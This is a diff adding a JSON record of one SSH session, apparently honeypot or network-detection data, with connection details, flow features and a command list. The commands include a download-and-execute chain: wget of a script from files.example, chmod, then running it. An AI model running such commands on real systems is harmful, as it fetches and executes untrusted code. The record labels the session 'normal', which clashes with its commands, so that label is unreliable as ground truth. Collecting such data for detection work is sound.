@@ -1,0 +1,49 @@
+{
+    "0ce16882846d": {
+        "src_ip": "172.22.0.2",
+        "src_port": 47020,
+        "dst_ip": "172.22.0.1",
+        "dst_port": 2222,
+        "protocol": "ssh",
+        "auth_success": 1,
+        "commands": [
+            "uname -a",
+            "wget http://files.example/x.sh -O x.sh",
+            "chmod +x x.sh",
+            "./x.sh",
+            "exit"
+        ],
+        "session_duration": 9.0,
+        "features": {
+            "session_id": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "src_port": 47020,
+            "dur": 9.0,
+            "proto": "ssh",
+            "service": "ssh",
+            "spkts": 5,
+            "dpkts": 7,
+            "sbytes": 69,
+            "dbytes": 838,
+            "rate": 100.7778,
+            "sttl": 64,
+            "dttl": 64,
+            "sload": 61.3333,
+            "dload": 744.8889,
+            "sinpkt": 1.5,
+            "dinpkt": 1.493333,
+            "sjit": 0.0,
+            "djit": 2.490636,
+            "tcprtt": 0.08,
+            "synack": 0.036,
+            "ackdat": 2.5,
+            "ct_srv_src": 1,
+            "ct_state_ttl": 1,
+            "ct_dst_ltm": 1,
+            "ct_src_ltm": 1,
+            "ct_srv_dst": 1,
+            "attack_cat": "normal",
+            "label": 0
+        }
+    }
+}
